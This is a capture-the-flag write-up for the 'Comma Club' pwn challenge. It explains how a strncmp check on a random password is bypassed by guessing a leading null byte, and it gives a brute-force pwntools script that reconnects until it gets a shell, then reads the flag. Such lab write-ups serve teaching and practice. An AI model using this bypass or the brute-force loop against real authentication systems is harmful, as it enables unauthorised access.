https://ctftime.org/event/2498

# Comma Club (pwn)

We need somone [sic] to run our vote tallying machine, and it needs to be someone trustworthy. Apparently there's some problem if a candidate gets too many votes. Shouldn't be a problem for us in Wyoming though.

nc comma-club.chal.hackthe.vote 1337

## Analysis

`main` @ `0x1c07`
- `getrandom` is used to get 16 random bytes and store them in `password` @ `0x5060`
- This means that we have a 1 in 256 chance of the first byte containing a specific value such as `0x00`
    - This will be important later

`check_password` @ `0x12c9`
- `scanf("%16s", local_28)` is used to read up to 16 non-whitespace characters from stdin
- `strncmp(local_28, password, 16)` is used to compare up to 16 non-null characters
    - This means that if we guess that first byte of `password` is `0x00` the rest of the password won't checked

Here I've recreated similar code to demonstrate how many attempts it takes to guess the first byte correctly:

```c
#include <fcntl.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main() {
    int fd = open("/dev/urandom", O_RDONLY);
    for (int i = 0; ; i++) {
        char password[16];
        read(fd, password, 16);
        if (strncmp("", password, 16) == 0) {
            printf("%d\n", i);
            break;
        }
    }
    return 0;
}
```

We can see in the following results values around 256:

```bash
❯ clang test.c && ./a.out
31
❯ clang test.c && ./a.out
370
❯ clang test.c && ./a.out
282
❯ clang test.c && ./a.out
241
```

## Solution

1) Attempt to close voting
2) Guess the password starts with `\x00`

```python
#!/usr/bin/env python3

from pwn import *

while True:
    with remote("comma-club.chal.hackthe.vote", 1337) as p:
        p.sendlineafter(b"> ", b"3")
        p.sendlineafter(b"> ", b"\x00")
        if b"Correct" in p.readline():
            p.sendlineafter(b"exit.", b"/bin/cat flag")
            p.interactive() # flag{w3lc0me_2_TH3_2_c0mm4_c1ub}
            break
```

## Flag
`flag{w3lc0me_2_TH3_2_c0mm4_c1ub}`

smiley 2024/11/03
